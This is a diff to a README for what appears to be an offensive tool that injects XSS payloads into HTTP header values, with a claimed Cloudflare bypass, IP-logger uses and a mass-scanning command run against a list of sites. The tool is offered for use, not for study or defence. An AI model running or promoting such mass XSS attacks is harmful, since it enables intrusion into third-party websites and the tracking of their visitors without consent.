@@ -5,6 +5,9 @@ https://xss.codes Http Header XSS Attacker
 
 Allows you to send XSS payloads to HTTP Header values (with Cloudflare Bypass)
 
+For use ; You must have an https://xss.codes account!
+
+
 You can Exploiting The : 
 
 *IP Loggers
@@ -28,7 +31,13 @@ echo "ip logged :".$sakso
 ?>
 ```
 
+### Usage
+
+
+
 
 ### Mass : 
 
-python mass.py -l sitelist.txt -u xss.codes userdomainname
+```
+python mass.py -l sitelist.txt -u your XSS.CODES User Domainname
+```
